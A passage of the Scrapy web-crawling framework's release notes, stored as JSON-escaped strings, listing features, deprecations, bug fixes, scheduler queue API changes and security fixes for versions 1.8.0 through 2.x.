(:issue:`4400`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n*   The ``FEED_FORMAT`` and ``FEED_URI`` settings have been deprecated in\n    favor of the new :setting:`FEEDS` setting (:issue:`1336`, :issue:`3858`,\n    :issue:`4507`)\n\n\nNew features\n~~~~~~~~~~~~\n\n*   A new setting, :setting:`FEEDS`, allows configuring multiple output feeds\n    with different settings each (:issue:`1336`, :issue:`3858`, :issue:`4507`)\n\n*   The :command:`crawl` and :command:`runspider` commands now support multiple\n    ``-o`` parameters (:issue:`1336`, :issue:`3858`, :issue:`4507`)\n\n*   The :command:`crawl` and :command:`runspider` commands now support\n    specifying an output format by appending ``:<format>`` to the output file\n    (:issue:`1336`, :issue:`3858`, :issue:`4507`)\n\n*   The new :attr:`Response.ip_address <scrapy.http.Response.ip_address>`\n    attribute gives access to the IP address that originated a response\n    (:issue:`3903`, :issue:`3940`)\n\n*   A warning is now issued when a value in\n    :attr:`~scrapy.spiders.Spider.allowed_domains` includes a port\n    (:issue:`50`, :issue:`3198`, :issue:`4413`)\n\n*   Zsh completion now excludes used option aliases from the completion list\n    (:issue:`4438`)\n\n\nBug fixes\n~~~~~~~~~\n\n*   :ref:`Request serialization <request-serialization>` no longer breaks for\n    callbacks that are spider attributes which are assigned a function with a\n    different name (:issue:`4500`)\n\n*   ``None`` values in :attr:`~scrapy.spiders.Spider.allowed_domains` no longer\n    cause a :exc:`TypeError` exception (:issue:`4410`)\n\n*   Zsh completion no longer allows options after arguments (:issue:`4438`)\n\n*   zope.interface 5.0.0 and later versions are now supported\n    (:issue:`4447`, :issue:`4448`)\n\n*   ``Spider.make_requests_from_url``, deprecated in Scrapy 1.4.0, now issues a\n    warning when used (:issue:`4412`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   Improved the documentation about signals that allow their handlers to\n    return a :class:`~twisted.internet.defer.Deferred` (:issue:`4295`,\n    :issue:`4390`)\n\n*   Our PyPI entry now includes links for our documentation, our source code\n    repository and our issue tracker (:issue:`4456`)\n\n*   Covered the `curl2scrapy <https://michael-shub.github.io/curl2scrapy/>`_\n    service in the documentation (:issue:`4206`, :issue:`4455`)\n\n*   Removed references to the Guppy library, which only works in Python 2\n    (:issue:`4285`, :issue:`4343`)\n\n*   Extended use of InterSphinx to link to Python 3 documentation\n    (:issue:`4444`, :issue:`4445`)\n\n*   Added support for Sphinx 3.0 and later (:issue:`4475`, :issue:`4480`,\n    :issue:`4496`, :issue:`4503`)\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n*   Removed warnings about using old, removed settings (:issue:`4404`)\n\n*   Removed a warning about importing\n    :class:`~twisted.internet.testing.StringTransport` from\n    ``twisted.test.proto_helpers`` in Twisted 19.7.0 or newer (:issue:`4409`)\n\n*   Removed outdated Debian package build files (:issue:`4384`)\n\n*   Removed :class:`object` usage as a base class (:issue:`4430`)\n\n*   Removed code that added support for old versions of Twisted that we no\n    longer support (:issue:`4472`)\n\n*   Fixed code style issues (:issue:`4468`, :issue:`4469`, :issue:`4471`,\n    :issue:`4481`)\n\n*   Removed :func:`twisted.internet.defer.returnValue` calls (:issue:`4443`,\n    :issue:`4446`, :issue:`4489`)\n\n\n.. _release-2.0.1:\n\n", "2.0.1": "-------------------------\n\n*   :meth:`Response.follow_all <scrapy.http.Response.follow_all>` now supports\n    an empty URL iterable as input (:issue:`4408`, :issue:`4420`)\n\n*   Removed top-level :mod:`~twisted.internet.reactor` imports to prevent\n    errors about the wrong Twisted reactor being installed when setting a\n    different Twisted reactor using :setting:`TWISTED_REACTOR` (:issue:`4401`,\n    :issue:`4406`)\n\n*   Fixed tests (:issue:`4422`)\n\n\n.. _release-2.0.0:\n\n", "2.0.0": "-------------------------\n\nHighlights:\n\n* Python 2 support has been removed\n* :doc:`Partial <topics/coroutines>` :ref:`coroutine syntax <async>` support\n  and :doc:`experimental <topics/asyncio>` :mod:`asyncio` support\n* New :meth:`Response.follow_all <scrapy.http.Response.follow_all>` method\n* :ref:`FTP support <media-pipeline-ftp>` for media pipelines\n* New :attr:`Response.certificate <scrapy.http.Response.certificate>`\n  attribute\n* IPv6 support through :setting:`DNS_RESOLVER`\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   Python 2 support has been removed, following `Python 2 end-of-life on\n    January 1, 2020`_ (:issue:`4091`, :issue:`4114`, :issue:`4115`,\n    :issue:`4121`, :issue:`4138`, :issue:`4231`, :issue:`4242`, :issue:`4304`,\n    :issue:`4309`, :issue:`4373`)\n\n*   Retry gaveups (see :setting:`RETRY_TIMES`) are now logged as errors instead\n    of as debug information (:issue:`3171`, :issue:`3566`)\n\n*   File extensions that\n    :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    ignores by default now also include ``7z``, ``7zip``, ``apk``, ``bz2``,\n    ``cdr``, ``dmg``, ``ico``, ``iso``, ``tar``, ``tar.gz``, ``webm``, and\n    ``xz`` (:issue:`1837`, :issue:`2067`, :issue:`4066`)\n\n*   The :setting:`METAREFRESH_IGNORE_TAGS` setting is now an empty list by\n    default, following web browser behavior (:issue:`3844`, :issue:`4311`)\n\n*   The\n    :class:`~scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware`\n    now includes spaces after commas in the value of the ``Accept-Encoding``\n    header that it sets, following web browser behavior (:issue:`4293`)\n\n*   The ``__init__`` method of custom download handlers (see\n    :setting:`DOWNLOAD_HANDLERS`) or subclasses of the following downloader\n    handlers  no longer receives a ``settings`` parameter:\n\n    *   :class:`scrapy.core.downloader.handlers.datauri.DataURIDownloadHandler`\n\n    *   :class:`scrapy.core.downloader.handlers.file.FileDownloadHandler`\n\n    Use the ``from_settings`` or ``from_crawler`` class methods to expose such\n    a parameter to your custom download handlers.\n\n    (:issue:`4126`)\n\n*   We have refactored the :class:`scrapy.core.scheduler.Scheduler` class and\n    related queue classes (see :setting:`SCHEDULER_PRIORITY_QUEUE`,\n    :setting:`SCHEDULER_DISK_QUEUE` and :setting:`SCHEDULER_MEMORY_QUEUE`) to\n    make it easier to implement custom scheduler queue classes. See\n    :ref:`2-0-0-scheduler-queue-changes` below for details.\n\n*   Overridden settings are now logged in a different format. This is more in\n    line with similar information logged at startup (:issue:`4199`)\n\n.. _Python 2 end-of-life on January 1, 2020: https://www.python.org/doc/sunset-python-2/\n\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n*   The :ref:`Scrapy shell <topics-shell>` no longer provides a `sel` proxy\n    object, use :meth:`response.selector <scrapy.http.Response.selector>`\n    instead (:issue:`4347`)\n\n*   LevelDB support has been removed (:issue:`4112`)\n\n*   The following functions have been removed from :mod:`scrapy.utils.python`:\n    ``isbinarytext``, ``is_writable``, ``setattr_default``, ``stringify_dict``\n    (:issue:`4362`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n*   Using environment variables prefixed with ``SCRAPY_`` to override settings\n    is deprecated (:issue:`4300`, :issue:`4374`, :issue:`4375`)\n\n*   :class:`scrapy.linkextractors.FilteringLinkExtractor` is deprecated, use\n    :class:`scrapy.linkextractors.LinkExtractor\n    <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>` instead (:issue:`4045`)\n\n*   The ``noconnect`` query string argument of proxy URLs is deprecated and\n    should be removed from proxy URLs (:issue:`4198`)\n\n*   The :meth:`next <scrapy.utils.python.MutableChain.next>` method of\n    :class:`scrapy.utils.python.MutableChain` is deprecated, use the global\n    :func:`next` function or :meth:`MutableChain.__next__\n    <scrapy.utils.python.MutableChain.__next__>` instead (:issue:`4153`)\n\n\nNew features\n~~~~~~~~~~~~\n\n*   Added :doc:`partial support <topics/coroutines>` for Python\u2019s\n    :ref:`coroutine syntax <async>` and :doc:`experimental support\n    <topics/asyncio>` for :mod:`asyncio` and :mod:`asyncio`-powered libraries\n    (:issue:`4010`, :issue:`4259`, :issue:`4269`, :issue:`4270`, :issue:`4271`,\n    :issue:`4316`, :issue:`4318`)\n\n*   The new :meth:`Response.follow_all <scrapy.http.Response.follow_all>`\n    method offers the same functionality as\n    :meth:`Response.follow <scrapy.http.Response.follow>` but supports an\n    iterable of URLs as input and returns an iterable of requests\n    (:issue:`2582`, :issue:`4057`, :issue:`4286`)\n\n*   :ref:`Media pipelines <topics-media-pipeline>` now support :ref:`FTP\n    storage <media-pipeline-ftp>` (:issue:`3928`, :issue:`3961`)\n\n*   The new :attr:`Response.certificate <scrapy.http.Response.certificate>`\n    attribute exposes the SSL certificate of the server as a\n    :class:`twisted.internet.ssl.Certificate` object for HTTPS responses\n    (:issue:`2726`, :issue:`4054`)\n\n*   A new :setting:`DNS_RESOLVER` setting allows enabling IPv6 support\n    (:issue:`1031`, :issue:`4227`)\n\n*   A new :setting:`SCRAPER_SLOT_MAX_ACTIVE_SIZE` setting allows configuring\n    the existing soft limit that pauses request downloads when the total\n    response data being processed is too high (:issue:`1410`, :issue:`3551`)\n\n*   A new :setting:`TWISTED_REACTOR` setting allows customizing the\n    :mod:`~twisted.internet.reactor` that Scrapy uses, allowing to\n    :doc:`enable asyncio support <topics/asyncio>` or deal with a\n    :ref:`common macOS issue <faq-specific-reactor>` (:issue:`2905`,\n    :issue:`4294`)\n\n*   Scheduler disk and memory queues may now use the class methods\n    ``from_crawler`` or ``from_settings`` (:issue:`3884`)\n\n*   The new :attr:`Response.cb_kwargs <scrapy.http.Response.cb_kwargs>`\n    attribute serves as a shortcut for :attr:`Response.request.cb_kwargs\n    <scrapy.http.Request.cb_kwargs>` (:issue:`4331`)\n\n*   :meth:`Response.follow <scrapy.http.Response.follow>` now supports a\n    ``flags`` parameter, for consistency with :class:`~scrapy.http.Request`\n    (:issue:`4277`, :issue:`4279`)\n\n*   :ref:`Item loader processors <topics-loaders-processors>` can now be\n    regular functions, they no longer need to be methods (:issue:`3899`)\n\n*   :class:`~scrapy.spiders.Rule` now accepts an ``errback`` parameter\n    (:issue:`4000`)\n\n*   :class:`~scrapy.http.Request` no longer requires a ``callback`` parameter\n    when an ``errback`` parameter is specified (:issue:`3586`, :issue:`4008`)\n\n*   :class:`~scrapy.logformatter.LogFormatter` now supports some additional\n    methods:\n\n    *   :class:`~scrapy.logformatter.LogFormatter.download_error` for\n        download errors\n\n    *   :class:`~scrapy.logformatter.LogFormatter.item_error` for exceptions\n        raised during item processing by :ref:`item pipelines\n        <topics-item-pipeline>`\n\n    *   :class:`~scrapy.logformatter.LogFormatter.spider_error` for exceptions\n        raised from :ref:`spider callbacks <topics-spiders>`\n\n    (:issue:`374`, :issue:`3986`, :issue:`3989`, :issue:`4176`, :issue:`4188`)\n\n*   The :setting:`FEED_URI` setting now supports :class:`pathlib.Path` values\n    (:issue:`3731`, :issue:`4074`)\n\n*   A new :signal:`request_left_downloader` signal is sent when a request\n    leaves the downloader (:issue:`4303`)\n\n*   Scrapy logs a warning when it detects a request callback or errback that\n    uses ``yield`` but also returns a value, since the returned value would be\n    lost (:issue:`3484`, :issue:`3869`)\n\n*   :class:`~scrapy.spiders.Spider` objects now raise an :exc:`AttributeError`\n    exception if they do not have a :class:`~scrapy.spiders.Spider.start_urls`\n    attribute nor reimplement :class:`~scrapy.spiders.Spider.start_requests`,\n    but have a ``start_url`` attribute (:issue:`4133`, :issue:`4170`)\n\n*   :class:`~scrapy.exporters.BaseItemExporter` subclasses may now use\n    ``super().__init__(**kwargs)`` instead of ``self._configure(kwargs)`` in\n    their ``__init__`` method, passing ``dont_fail=True`` to the parent\n    ``__init__`` method if needed, and accessing ``kwargs`` at ``self._kwargs``\n    after calling their parent ``__init__`` method (:issue:`4193`,\n    :issue:`4370`)\n\n*   A new ``keep_fragments`` parameter of\n    ``scrapy.utils.request.request_fingerprint`` allows to generate\n    different fingerprints for requests with different fragments in their URL\n    (:issue:`4104`)\n\n*   Download handlers (see :setting:`DOWNLOAD_HANDLERS`) may now use the\n    ``from_settings`` and ``from_crawler`` class methods that other Scrapy\n    components already supported (:issue:`4126`)\n\n*   :class:`scrapy.utils.python.MutableChain.__iter__` now returns ``self``,\n    `allowing it to be used as a sequence <https://lgtm.com/rules/4850080/>`_\n    (:issue:`4153`)\n\n\nBug fixes\n~~~~~~~~~\n\n*   The :command:`crawl` command now also exits with exit code 1 when an\n    exception happens before the crawling starts (:issue:`4175`, :issue:`4207`)\n\n*   :class:`LinkExtractor.extract_links\n    <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor.extract_links>` no longer\n    re-encodes the query string or URLs from non-UTF-8 responses in UTF-8\n    (:issue:`998`, :issue:`1403`, :issue:`1949`, :issue:`4321`)\n\n*   The first spider middleware (see :setting:`SPIDER_MIDDLEWARES`) now also\n    processes exceptions raised from callbacks that are generators\n    (:issue:`4260`, :issue:`4272`)\n\n*   Redirects to URLs starting with 3 slashes (``///``) are now supported\n    (:issue:`4032`, :issue:`4042`)\n\n*   :class:`~scrapy.http.Request` no longer accepts strings as ``url`` simply\n    because they have a colon (:issue:`2552`, :issue:`4094`)\n\n*   The correct encoding is now used for attach names in\n    :class:`~scrapy.mail.MailSender` (:issue:`4229`, :issue:`4239`)\n\n*   :class:`~scrapy.dupefilters.RFPDupeFilter`, the default\n    :setting:`DUPEFILTER_CLASS`, no longer writes an extra ``\\r`` character on\n    each line in Windows, which made the size of the ``requests.seen`` file\n    unnecessarily large on that platform (:issue:`4283`)\n\n*   Z shell auto-completion now looks for ``.html`` files, not ``.http`` files,\n    and covers the ``-h`` command-line switch (:issue:`4122`, :issue:`4291`)\n\n*   Adding items to a :class:`scrapy.utils.datatypes.LocalCache` object\n    without a ``limit`` defined no longer raises a :exc:`TypeError` exception\n    (:issue:`4123`)\n\n*   Fixed a typo in the message of the :exc:`ValueError` exception raised when\n    :func:`scrapy.utils.misc.create_instance` gets both ``settings`` and\n    ``crawler`` set to ``None`` (:issue:`4128`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   API documentation now links to an online, syntax-highlighted view of the\n    corresponding source code (:issue:`4148`)\n\n*   Links to unexisting documentation pages now allow access to the sidebar\n    (:issue:`4152`, :issue:`4169`)\n\n*   Cross-references within our documentation now display a tooltip when\n    hovered (:issue:`4173`, :issue:`4183`)\n\n*   Improved the documentation about :meth:`LinkExtractor.extract_links\n    <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor.extract_links>` and\n    simplified :ref:`topics-link-extractors` (:issue:`4045`)\n\n*   Clarified how :class:`ItemLoader.item <scrapy.loader.ItemLoader.item>`\n    works (:issue:`3574`, :issue:`4099`)\n\n*   Clarified that :func:`logging.basicConfig` should not be used when also\n    using :class:`~scrapy.crawler.CrawlerProcess` (:issue:`2149`,\n    :issue:`2352`, :issue:`3146`, :issue:`3960`)\n\n*   Clarified the requirements for :class:`~scrapy.http.Request` objects\n    :ref:`when using persistence <request-serialization>` (:issue:`4124`,\n    :issue:`4139`)\n\n*   Clarified how to install a :ref:`custom image pipeline\n    <media-pipeline-example>` (:issue:`4034`, :issue:`4252`)\n\n*   Fixed the signatures of the ``file_path`` method in :ref:`media pipeline\n    <topics-media-pipeline>` examples (:issue:`4290`)\n\n*   Covered a backward-incompatible change in Scrapy 1.7.0 affecting custom\n    :class:`scrapy.core.scheduler.Scheduler` subclasses (:issue:`4274`)\n\n*   Improved the ``README.rst`` and ``CODE_OF_CONDUCT.md`` files\n    (:issue:`4059`)\n\n*   Documentation examples are now checked as part of our test suite and we\n    have fixed some of the issues detected (:issue:`4142`, :issue:`4146`,\n    :issue:`4171`, :issue:`4184`, :issue:`4190`)\n\n*   Fixed logic issues, broken links and typos (:issue:`4247`, :issue:`4258`,\n    :issue:`4282`, :issue:`4288`, :issue:`4305`, :issue:`4308`, :issue:`4323`,\n    :issue:`4338`, :issue:`4359`, :issue:`4361`)\n\n*   Improved consistency when referring to the ``__init__`` method of an object\n    (:issue:`4086`, :issue:`4088`)\n\n*   Fixed an inconsistency between code and output in :ref:`intro-overview`\n    (:issue:`4213`)\n\n*   Extended :mod:`~sphinx.ext.intersphinx` usage (:issue:`4147`,\n    :issue:`4172`, :issue:`4185`, :issue:`4194`, :issue:`4197`)\n\n*   We now use a recent version of Python to build the documentation\n    (:issue:`4140`, :issue:`4249`)\n\n*   Cleaned up documentation (:issue:`4143`, :issue:`4275`)\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n*   Re-enabled proxy ``CONNECT`` tests (:issue:`2545`, :issue:`4114`)\n\n*   Added Bandit_ security checks to our test suite (:issue:`4162`,\n    :issue:`4181`)\n\n*   Added Flake8_ style checks to our test suite and applied many of the\n    corresponding changes (:issue:`3944`, :issue:`3945`, :issue:`4137`,\n    :issue:`4157`, :issue:`4167`, :issue:`4174`, :issue:`4186`, :issue:`4195`,\n    :issue:`4238`, :issue:`4246`, :issue:`4355`, :issue:`4360`, :issue:`4365`)\n\n*   Improved test coverage (:issue:`4097`, :issue:`4218`, :issue:`4236`)\n\n*   Started reporting slowest tests, and improved the performance of some of\n    them (:issue:`4163`, :issue:`4164`)\n\n*   Fixed broken tests and refactored some tests (:issue:`4014`, :issue:`4095`,\n    :issue:`4244`, :issue:`4268`, :issue:`4372`)\n\n*   Modified the :doc:`tox <tox:index>` configuration to allow running tests\n    with any Python version, run Bandit_ and Flake8_ tests by default, and\n    enforce a minimum tox version programmatically (:issue:`4179`)\n\n*   Cleaned up code (:issue:`3937`, :issue:`4208`, :issue:`4209`,\n    :issue:`4210`, :issue:`4212`, :issue:`4369`, :issue:`4376`, :issue:`4378`)\n\n.. _Bandit: https://bandit.readthedocs.io/\n.. _Flake8: https://flake8.pycqa.org/en/latest/\n\n\n.. _2-0-0-scheduler-queue-changes:\n\nChanges to scheduler queue classes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe following changes may impact any custom queue classes of all types:\n\n*   The ``push`` method no longer receives a second positional parameter\n    containing ``request.priority * -1``. If you need that value, get it\n    from the first positional parameter, ``request``, instead, or use\n    the new :meth:`~scrapy.core.scheduler.ScrapyPriorityQueue.priority`\n    method in :class:`scrapy.core.scheduler.ScrapyPriorityQueue`\n    subclasses.\n\nThe following changes may impact custom priority queue classes:\n\n*   In the ``__init__`` method or the ``from_crawler`` or ``from_settings``\n    class methods:\n\n    *   The parameter that used to contain a factory function,\n        ``qfactory``, is now passed as a keyword parameter named\n        ``downstream_queue_cls``.\n\n    *   A new keyword parameter has been added: ``key``. It is a string\n        that is always an empty string for memory queues and indicates the\n        :setting:`JOB_DIR` value for disk queues.\n\n    *   The parameter for disk queues that contains data from the previous\n        crawl, ``startprios`` or ``slot_startprios``, is now passed as a\n        keyword parameter named ``startprios``.\n\n    *   The ``serialize`` parameter is no longer passed. The disk queue\n        class must take care of request serialization on its own before\n        writing to disk, using the\n        :func:`~scrapy.utils.reqser.request_to_dict` and\n        :func:`~scrapy.utils.reqser.request_from_dict` functions from the\n        :mod:`scrapy.utils.reqser` module.\n\nThe following changes may impact custom disk and memory queue classes:\n\n*   The signature of the ``__init__`` method is now\n    ``__init__(self, crawler, key)``.\n\nThe following changes affect specifically the\n:class:`~scrapy.core.scheduler.ScrapyPriorityQueue` and\n:class:`~scrapy.core.scheduler.DownloaderAwarePriorityQueue` classes from\n:mod:`scrapy.core.scheduler` and may affect subclasses:\n\n*   In the ``__init__`` method, most of the changes described above apply.\n\n    ``__init__`` may still receive all parameters as positional parameters,\n    however:\n\n    *   ``downstream_queue_cls``, which replaced ``qfactory``, must be\n        instantiated differently.\n\n        ``qfactory`` was instantiated with a priority value (integer).\n\n        Instances of ``downstream_queue_cls`` should be created using\n        the new\n        :meth:`ScrapyPriorityQueue.qfactory <scrapy.core.scheduler.ScrapyPriorityQueue.qfactory>`\n        or\n        :meth:`DownloaderAwarePriorityQueue.pqfactory <scrapy.core.scheduler.DownloaderAwarePriorityQueue.pqfactory>`\n        methods.\n\n    *   The new ``key`` parameter displaced the ``startprios``\n        parameter 1 position to the right.\n\n*   The following class attributes have been added:\n\n    *   :attr:`~scrapy.core.scheduler.ScrapyPriorityQueue.crawler`\n\n    *   :attr:`~scrapy.core.scheduler.ScrapyPriorityQueue.downstream_queue_cls`\n        (details above)\n\n    *   :attr:`~scrapy.core.scheduler.ScrapyPriorityQueue.key` (details above)\n\n*   The ``serialize`` attribute has been removed (details above)\n\nThe following changes affect specifically the\n:class:`~scrapy.core.scheduler.ScrapyPriorityQueue` class and may affect\nsubclasses:\n\n*   A new :meth:`~scrapy.core.scheduler.ScrapyPriorityQueue.priority`\n    method has been added which, given a request, returns\n    ``request.priority * -1``.\n\n    It is used in :meth:`~scrapy.core.scheduler.ScrapyPriorityQueue.push`\n    to make up for the removal of its ``priority`` parameter.\n\n*   The ``spider`` attribute has been removed. Use\n    :attr:`crawler.spider <scrapy.core.scheduler.ScrapyPriorityQueue.crawler>`\n    instead.\n\nThe following changes affect specifically the\n:class:`~scrapy.core.scheduler.DownloaderAwarePriorityQueue` class and may\naffect subclasses:\n\n*   A new :attr:`~scrapy.core.scheduler.DownloaderAwarePriorityQueue.pqueues`\n    attribute offers a mapping of downloader slot names to the\n    corresponding instances of\n    :attr:`~scrapy.core.scheduler.DownloaderAwarePriorityQueue.downstream_queue_cls`.\n\n(:issue:`3884`)\n\n.. _release-1.8.4:\n\n", "1.8.4": "-------------------------\n\n**Security bug fixes:**\n\n-   Due to its `ReDoS vulnerabilities`_, ``scrapy.utils.iterators.xmliter`` is\n    now deprecated in favor of :func:`~scrapy.utils.iterators.xmliter_lxml`,\n    which :class:`~scrapy.spiders.XMLFeedSpider` now uses.\n\n    To minimize the impact of this change on existing code,\n    :func:`~scrapy.utils.iterators.xmliter_lxml` now supports indicating\n    the node namespace as a prefix in the node name, and big files with highly\n    nested trees when using libxml2 2.7+.\n\n    Please, see the `cc65-xxvf-f7r9 security advisory`_ for more information.\n\n-   :setting:`DOWNLOAD_MAXSIZE` and :setting:`DOWNLOAD_WARNSIZE` now also apply\n    to the decompressed response body. Please, see the `7j7m-v7m3-jqm7 security\n    advisory`_ for more information.\n\n-   Also in relation with the `7j7m-v7m3-jqm7 security advisory`_, use of the\n    ``scrapy.downloadermiddlewares.decompression`` module is discouraged and\n    will trigger a warning.\n\n-   The ``Authorization`` header is now dropped on redirects to a different\n    domain. Please, see the `cw9j-q3vf-hrrv security advisory`_ for more\n    information.\n\n    .. _cw9j-q3vf-hrrv security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv\n\n\n.. _release-1.8.3:\n\n", "1.8.3": "-------------------------\n\n**Security bug fix:**\n\n-   When :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware`\n    processes a request with :reqmeta:`proxy` metadata, and that\n    :reqmeta:`proxy` metadata includes proxy credentials,\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` sets\n    the ``Proxy-Authorization`` header, but only if that header is not already\n    set.\n\n    There are third-party proxy-rotation downloader middlewares that set\n    different :reqmeta:`proxy` metadata every time they process a request.\n\n    Because of request retries and redirects, the same request can be processed\n    by downloader middlewares more than once, including both\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` and\n    any third-party proxy-rotation downloader middleware.\n\n    These third-party proxy-rotation downloader middlewares could change the\n    :reqmeta:`proxy` metadata of a request to a new value, but fail to remove\n    the ``Proxy-Authorization`` header from the previous value of the\n    :reqmeta:`proxy` metadata, causing the credentials of one proxy to be sent\n    to a different proxy.\n\n    To prevent the unintended leaking of proxy credentials, the behavior of\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` is now\n    as follows when processing a request:\n\n    -   If the request being processed defines :reqmeta:`proxy` metadata that\n        includes credentials, the ``Proxy-Authorization`` header is always\n        updated to feature those credentials.\n\n    -   If the request being processed defines :reqmeta:`proxy` metadata\n        without credentials, the ``Proxy-Authorization`` header is removed\n        *unless* it was originally defined for the same proxy URL.\n\n        To remove proxy credentials while keeping the same proxy URL, remove\n        the ``Proxy-Authorization`` header.\n\n    -   If the request has no :reqmeta:`proxy` metadata, or that metadata is a\n        falsy value (e.g. ``None``), the ``Proxy-Authorization`` header is\n        removed.\n\n        It is no longer possible to set a proxy URL through the\n        :reqmeta:`proxy` metadata but set the credentials through the\n        ``Proxy-Authorization`` header. Set proxy credentials through the\n        :reqmeta:`proxy` metadata instead.\n\n\n.. _release-1.8.2:\n\n", "1.8.2": "-------------------------\n\n**Security bug fixes:**\n\n-   When a :class:`~scrapy.http.Request` object with cookies defined gets a\n    redirect response causing a new :class:`~scrapy.http.Request` object to be\n    scheduled, the cookies defined in the original\n    :class:`~scrapy.http.Request` object are no longer copied into the new\n    :class:`~scrapy.http.Request` object.\n\n    If you manually set the ``Cookie`` header on a\n    :class:`~scrapy.http.Request` object and the domain name of the redirect\n    URL is not an exact match for the domain of the URL of the original\n    :class:`~scrapy.http.Request` object, your ``Cookie`` header is now dropped\n    from the new :class:`~scrapy.http.Request` object.\n\n    The old behavior could be exploited by an attacker to gain access to your\n    cookies. Please, see the `cjvr-mfj7-j4j8 security advisory`_ for more\n    information.\n\n    .. _cjvr-mfj7-j4j8 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\n\n    .. note:: It is still possible to enable the sharing of cookies between\n              different domains with a shared domain suffix (e.g.\n              ``example.com`` and any subdomain) by defining the shared domain\n              suffix (e.g. ``example.com``) as the cookie domain when defining\n              your cookies. See the documentation of the\n              :class:`~scrapy.http.Request` class for more information.\n\n-   When the domain of a cookie, either received in the ``Set-Cookie`` header\n    of a response or defined in a :class:`~scrapy.http.Request` object, is set\n    to a `public suffix <https://publicsuffix.org/>`_, the cookie is now\n    ignored unless the cookie domain is the same as the request domain.\n\n    The old behavior could be exploited by an attacker to inject cookies into\n    your requests to some other domains. Please, see the `mfjm-vh54-3f96\n    security advisory`_ for more information.\n\n    .. _mfjm-vh54-3f96 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\n\n\n.. _release-1.8.1:\n\n", "1.8.1": "-------------------------\n\n*   **Security bug fix:**\n\n    If you use\n    :class:`~scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware`\n    (i.e. the ``http_user`` and ``http_pass`` spider attributes) for HTTP\n    authentication, any request exposes your credentials to the request target.\n\n    To prevent unintended exposure of authentication credentials to unintended\n    domains, you must now additionally set a new, additional spider attribute,\n    ``http_auth_domain``, and point it to the specific domain to which the\n    authentication credentials must be sent.\n\n    If the ``http_auth_domain`` spider attribute is not set, the domain of the\n    first request will be considered the HTTP authentication target, and\n    authentication credentials will only be sent in requests targeting that\n    domain.\n\n    If you need to send the same HTTP authentication credentials to multiple\n    domains, you can use :func:`w3lib.http.basic_auth_header` instead to\n    set the value of the ``Authorization`` header of your requests.\n\n    If you *really* want your spider to send the same HTTP authentication\n    credentials to any domain, set the ``http_auth_domain`` spider attribute\n    to ``None``.\n\n    Finally, if you are a user of `scrapy-splash`_, know that this version of\n    Scrapy breaks compatibility with scrapy-splash 0.7.2 and earlier. You will\n    need to upgrade scrapy-splash to a greater version for it to continue to\n    work.\n\n.. _scrapy-splash: https://github.com/scrapy-plugins/scrapy-splash\n\n\n.. _release-1.8.0:\n\n", "1.8.0": "-------------------------\n\nHighlights:\n\n* Dropped Python 3.4 support and updated minimum requirements; made Python 3.8\n  support official\n* New :meth:`Request.from_curl <scrapy.http.Request.from_curl>` class method\n* New :setting:`ROBOTSTXT_PARSER` and :setting:`ROBOTSTXT_USER_AGENT` settings\n* New :setting:`DOWNLOADER_CLIENT_TLS_CIPHERS` and\n  :setting:`DOWNLOADER_CLIENT_TLS_VERBOSE_LOGGING` settings\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   Python 3.4 is no longer supported, and some of the minimum requirements of\n    Scrapy have also changed:\n\n    *   :doc:`cssselect <cssselect:index>` 0.9.1\n    *   cryptography_ 2.0\n    *   lxml_ 3.5.0\n    *   pyOpenSSL_ 16.2.0\n    *   queuelib_ 1.4.2\n    *   service_identity_ 16.0.0\n    *   six_ 1.10.0\n    *   Twisted_ 17.9.0 (16.0.0 with Python 2)\n    *   zope.interface_ 4.1.3\n\n    (:issue:`3892`)\n\n*   ``JSONRequest`` is now called :class:`~scrapy.http.JsonRequest` for\n    consistency with similar classes (:issue:`3929`, :issue:`3982`)\n\n*   If you are using a custom context factory\n    (:setting:`DOWNLOADER_CLIENTCONTEXTFACTORY`), its ``__init__`` method must\n    accept two new parameters: ``tls_verbose_logging`` and ``tls_ciphers``\n    (:issue:`2111`, :issue:`3392`, :issue:`3442`, :issue:`3450`)\n\n*   :class:`~scrapy.loader.ItemLoader` now turns the values of its input item\n    into lists:\n\n    .. code-block:: pycon\n\n        >>> item = MyItem()\n        >>> item[\"field\"] = \"value1\"\n        >>> loader = ItemLoader(item=item)\n        >>> item[\"field\"]\n        ['value1']\n\n    This is needed to allow adding values to existing fields\n    (``loader.add_value('field', 'value2')``).\n\n    (:issue:`3804`, :issue:`3819`, :issue:`3897`, :issue:`3976`, :issue:`3998`,\n    :issue:`4036`)\n\nSee also :ref:`1.8-deprecation-removals` below.\n\n\nNew features\n~~~~~~~~~~~~\n\n*   A new :meth:`Request.from_curl <scrapy.http.Request.from_curl>` class\n    method allows :ref:`creating a request from a cURL command\n    <requests-from-curl>` (:issue:`2985`, :issue:`3862`)\n\n*   A new :setting:`ROBOTSTXT_PARSER` setting allows choosing which robots.txt_\n    parser to use. It includes built-in support for\n    :ref:`RobotFileParser <python-robotfileparser>`,\n    :ref:`Protego <protego-parser>` (default), :ref:`Reppy <reppy-parser>`, and\n    :ref:`Robotexclusionrulesparser <rerp-parser>`, and allows you to\n    :ref:`implement support for additional parsers\n    